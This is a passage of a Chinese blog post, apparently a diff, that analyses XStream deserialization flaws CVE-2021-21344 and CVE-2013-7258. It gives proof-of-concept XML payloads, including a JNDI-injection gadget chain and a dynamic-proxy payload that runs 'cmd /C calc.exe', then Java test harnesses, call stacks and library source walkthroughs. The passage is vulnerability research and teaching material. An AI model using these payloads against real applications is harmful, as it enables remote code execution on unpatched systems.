class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试文件：里面的xml为上面的POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE202121344</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong>：<br>第一：java.util.PriorityQueue<br>根据POC的根节点使用的是PriorityQueue，这也是链的第一步，在反序列化的过程中会调用其readObject函数<br>在CC2中了解到此链的触发点是comparator的compare函数，POC中将compara设置成sun.awt.datatransfer.DataTransferer$IndexOrderComparator<br>第二：sun.awt.datatransfer.DataTransferer<br>成功设置comparator后，在调用PriorityQueue函数的siftDownUsingComparator方法后，会成功跳转至DataTransferer的compare方法，接着后面的某段链没了解过<br>第三：com.sun.rowset.JdbcRowSetImpl<br>来到JdbcRowSetImpl的getDatabaseMetaData方法,在里面它调用connect方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> DatabaseMetaData <span class="title function_">getDatabaseMetaData</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="built_in">this</span>.connect();</span><br><span class="line">    <span class="keyword">return</span> var1.getMetaData();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此链在fastjson中使用过，查看其connect方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="built_in">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getUrl() != <span class="literal">null</span> ? DriverManager.getConnection(<span class="built_in">this</span>.getUrl(), <span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里通过JNDI去lookup存放在属性dataSource的地址，在上面的POC中我们将dataSource设置成了恶意的rmi地址<br>第四步：JNDI注入<br>接下来的过程就是JNDI注入的那一套了<br><strong>函数调用栈</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference:<span class="number">142</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">decodeObject:<span class="number">464</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">124</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">connect:<span class="number">624</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:<span class="number">4004</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">get:<span class="number">343</span>, Accessor$GetterSetterReflection (com.sun.xml.internal.bind.v2.runtime.reflect)</span><br><span class="line">serializeURIs:<span class="number">402</span>, ClassBeanInfoImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">childAsXsiType:<span class="number">662</span>, XMLSerializer (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">write:<span class="number">256</span>, MarshallerImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:<span class="number">89</span>, BridgeImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:<span class="number">130</span>, Bridge (com.sun.xml.internal.bind.api)</span><br><span class="line">marshal:<span class="number">161</span>, BridgeWrapper (com.sun.xml.internal.ws.db.glassfish)</span><br><span class="line">writeTo:<span class="number">109</span>, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">asInputStream:<span class="number">99</span>, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getInputStream:<span class="number">125</span>, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getMessage:<span class="number">366</span>, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:<span class="number">465</span>, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:<span class="number">103</span>, MessageWrapper (com.sun.xml.internal.ws.api.message)</span><br><span class="line">get:<span class="number">111</span>, ResponseContext (com.sun.xml.internal.ws.client)</span><br><span class="line">compareIndices:<span class="number">2492</span>, DataTransferer$IndexedComparator (sun.awt.datatransfer)</span><br><span class="line">compare:<span class="number">2970</span>, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">795</span>, PriorityQueue (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">callReadObject:<span class="number">132</span>, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:<span class="number">443</span>, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:<span class="number">277</span>, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">72</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1409</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1388</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1273</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1264</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">112</span>, CVE202121344 (Xstream)</span><br></pre></td></tr></table></figure>
+
+<h1 id="CVE-2013-7258"><a href="#CVE-2013-7258" class="headerlink" title="CVE-2013-7258"></a>CVE-2013-7258</h1><p><strong>影响版本</strong>：1.4.x-1.4.6及1.4.10<br><strong>测试环境</strong>：XStream1.4.5 JDK1.8_66<br><strong>复现</strong>：<br>POC</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/C<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试文件：里面的XML为上面的POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE20137258</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong>：<br>根据前面的fromXML的流程，单步执行至TreeUnmarshaller的start函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">start</span><span class="params">(DataHolder dataHolder)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.dataHolder = dataHolder;</span><br><span class="line">    <span class="comment">// 根据XML的根标签获取对应的class</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">type</span> <span class="operator">=</span> HierarchicalStreams.readClassType(<span class="built_in">this</span>.reader, <span class="built_in">this</span>.mapper);</span><br><span class="line">    <span class="comment">// 将对应的class转换成Java对象</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.convertAnother((Object)<span class="literal">null</span>, type);</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">validations</span> <span class="operator">=</span> <span class="built_in">this</span>.validationList.iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(validations.hasNext()) &#123;</span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">runnable</span> <span class="operator">=</span> (Runnable)validations.next();</span><br><span class="line">        runnable.run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入readClassType函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title function_">readClassType</span><span class="params">(HierarchicalStreamReader reader, Mapper mapper)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">classAttribute</span> <span class="operator">=</span> readClassAttribute(reader, mapper);</span><br><span class="line">    Class type;</span><br><span class="line">    <span class="keyword">if</span> (classAttribute == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 根据节点名从mapper中得到对应的type</span></span><br><span class="line">        type = mapper.realClass(reader.getNodeName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        type = mapper.realClass(classAttribute);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入realClass函数:com\thoughtworks\xstream\mapper\CachingMapper.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class <span class="title function_">realClass</span><span class="params">(String elementName)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取根元素</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">cached</span> <span class="operator">=</span> <span class="built_in">this</span>.realClassCache.get(elementName);</span><br><span class="line">    <span class="comment">// 如果realClassCache中存在，直接返回即可</span></span><br><span class="line">    <span class="keyword">if</span> (cached != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cached <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Class)cached;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> (CannotResolveClassException)cached;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 调用父类的realClass继续解析</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">super</span>.realClass(elementName);</span><br><span class="line">            <span class="comment">// 并将其存放至realClassCache</span></span><br><span class="line">            <span class="built_in">this</span>.realClassCache.put(elementName, result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotResolveClassException var4) &#123;</span><br><span class="line">            <span class="built_in">this</span>.realClassCache.put(elementName, var4);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到了根元素的class，返回至TreeUnmarshaller的start函数，这时来到了下面这条语句</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.convertAnother((Object)<span class="literal">null</span>, type);</span><br></pre></td></tr></table></figure>
+
+<p>此时的type正是上面获取的class：java.util.SortedSet<br>进入TreeUnmarshaller的convertAnother函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">convertAnother</span><span class="params">(Object parent, Class type)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.convertAnother(parent, type, (Converter)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>转换成3个参数的convertAnother函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">convertAnother</span><span class="params">(Object parent, Class type, Converter converter)</span> &#123;</span><br><span class="line">    type = <span class="built_in">this</span>.mapper.defaultImplementationOf(type);</span><br><span class="line">    <span class="keyword">if</span> (converter == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 根据type获取对应的converter</span></span><br><span class="line">        converter = <span class="built_in">this</span>.converterLookup.lookupConverterForType(type);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!converter.canConvert(type)) &#123;</span><br><span class="line">        <span class="type">ConversionException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Explicit selected converter cannot handle type&quot;</span>);</span><br><span class="line">        e.add(<span class="string">&quot;item-type&quot;</span>, type.getName());</span><br><span class="line">        e.add(<span class="string">&quot;converter-type&quot;</span>, converter.getClass().getName());</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 然后将type转换成对应的object</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.convert(parent, type, converter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的converter是TreeSetConverter转换器，其中lookupConverterForType函数在上面分析过<br>接下来进入到AbstractReferenceUnmarshaller.class的convert函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">convert</span><span class="params">(Object parent, Class type, Converter converter)</span> &#123;</span><br><span class="line">    Object result;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.parentStack.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        result = <span class="built_in">this</span>.parentStack.peek();</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.values.containsKey(result)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.values.put(result, parent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 从mapper中获取reference别名</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">attributeName</span> <span class="operator">=</span> <span class="built_in">this</span>.getMapper().aliasForSystemAttribute(<span class="string">&quot;reference&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">reference</span> <span class="operator">=</span> attributeName == <span class="literal">null</span> ? <span class="literal">null</span> : <span class="built_in">this</span>.reader.getAttribute(attributeName);</span><br><span class="line">    Object cache;</span><br><span class="line">    <span class="keyword">if</span> (reference != <span class="literal">null</span>) &#123;</span><br><span class="line">        cache = <span class="built_in">this</span>.values.get(<span class="built_in">this</span>.getReferenceKey(reference));</span><br><span class="line">        <span class="keyword">if</span> (cache == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ConversionException</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Invalid reference&quot;</span>);</span><br><span class="line">            ex.add(<span class="string">&quot;reference&quot;</span>, reference);</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result = cache == NULL ? <span class="literal">null</span> : cache;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 获取当前标签</span></span><br><span class="line">        cache = <span class="built_in">this</span>.getCurrentReferenceKey();</span><br><span class="line">        <span class="comment">// 并将其压入栈中</span></span><br><span class="line">        <span class="built_in">this</span>.parentStack.push(cache);</span><br><span class="line">        <span class="comment">// 然后调用父类的convert方法</span></span><br><span class="line">        result = <span class="built_in">super</span>.convert(parent, type, converter);</span><br><span class="line">        <span class="keyword">if</span> (cache != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.values.put(cache, result == <span class="literal">null</span> ? NULL : result);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.parentStack.popSilently();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看TreeUnmarshaller的convert方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">convert</span><span class="params">(Object parent, Class type, Converter converter)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="built_in">this</span>.types.push(type);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> converter.unmarshal(<span class="built_in">this</span>.reader, <span class="built_in">this</span>);</span><br><span class="line">        <span class="built_in">this</span>.types.popSilently();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ConversionException var6) 